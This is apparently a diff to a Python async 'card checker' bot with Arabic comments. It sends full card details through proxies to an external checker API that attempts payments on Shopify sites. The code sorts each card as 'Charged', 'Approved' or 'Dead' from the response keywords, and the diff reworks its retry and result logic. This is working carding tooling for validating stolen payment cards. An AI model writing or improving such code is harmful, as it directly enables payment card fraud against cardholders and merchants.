@@ -138,79 +138,69 @@ async def get_bin_info(card_number):
         return '-', '-', '-', '-', '-', ''
 
 async def check_card(card, site, proxy):
-    """Check a single card against a site using the parallel checker API (From Bot 2)"""
+    """Check a single card against a site with the corrected API structure and error handling."""
     try:
-        parts = card.split('|')
-        if len(parts) != 4:
-            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
-
+        # التأكد من تنسيق الموقع
         if not site.startswith('http'):
             site = f'https://{site}'
         
-        proxy_str = None
-        if proxy:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) == 4:
-                ip, port, user, password = proxy_parts
-                proxy_str = f"{ip}:{port}:{user}:{password}"
-            elif len(proxy_parts) == 2:
-                ip, port = proxy_parts
-                proxy_str = f"{ip}:{port}"
-            else:
-                proxy_str = proxy
+        # تنسيق البروكسي كما هو مطلوب
+        proxy_str = proxy 
         
-        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
-        if proxy_str:
-            url += f'&proxy={proxy_str}'
+        # الترتيب الدقيق للرابط: site -> cc -> proxy
+        url = f'{CHECKER_API_URL}?site={site}&cc={card}&proxy={proxy_str}'
 
-        timeout = aiohttp.ClientTimeout(total=100)
+        # زيادة وقت الانتظار لتجنب أخطاء الشبكة المؤقتة
+        timeout = aiohttp.ClientTimeout(total=45) 
+        
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as resp:
-                if resp.status != 200:
+                
+                # معالجة الخطأ 502 و 504 كإعادة محاولة (Retry) لضمان عدم ضياع الكرت
+                if resp.status in [502, 503, 504]:
                     return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
+                
+                # إذا كان الخطأ غير ذلك، نعتبره ميت
+                if resp.status != 200:
+                    return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card, 'gateway': 'Unknown', 'price': '-'}
                 
                 try:
                     raw = await resp.json()
                 except:
-                    text = await resp.text()
-                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
+                    return {'status': 'Dead', 'message': 'Invalid JSON Response', 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
+        # معالجة بيانات الرد من الـ API
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
         if price != '-' and price != 0:
             price = f"${price}"
         gateway = raw.get('Gateway', 'Shopify')
-        status_api = raw.get('Status', False)
-
-        if is_site_dead(response_msg, gateway, price):
-            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
+        
+        # التأكد من أن الموقع ما يزال يعمل (إذا كانت الرسالة فارغة أو السعر صفر)
+        if not response_msg or gateway == "Unknown" or price in ["-", "$-", "$0", "$0.0"]:
+            return {'status': 'Site Error', 'message': 'Gateway Inactive', 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
 
         response_lower = response_msg.lower()
 
-        if 'charged' in response_lower or 'order_placed' in response_lower:
+        # منطق الفحص (النتائج)
+        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
             return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
-        elif 'thank you' in response_lower or 'payment successful' in response_lower:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
+        
         elif any(key in response_lower for key in [
-            'approved', 'success',
-            'insufficient_funds', 'insufficient funds',
-            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
-            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
-            'incorrect_zip', 'incorrect zip', 'cvv issue',
-            '3d', '3d secure', 'otp', 'verification required',
-            'authenticate', 'authentication required', 'challenge required',
-            'redirecting to bank', 'bank verification', 'send code',
-            'enter code', 'verify'
+            'approved', 'success', 'insufficient_funds', 'invalid_cvv', 
+            'incorrect_cvv', 'incorrect_zip', '3d', 'otp', 'verification', 
+            'authenticate', 'challenge required', 'redirecting'
         ]):
             return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
+        
         else:
             return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
 
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
     except Exception as e:
-        error_msg = str(e)
-        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}
+        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
     """Check a card with automatic retry"""
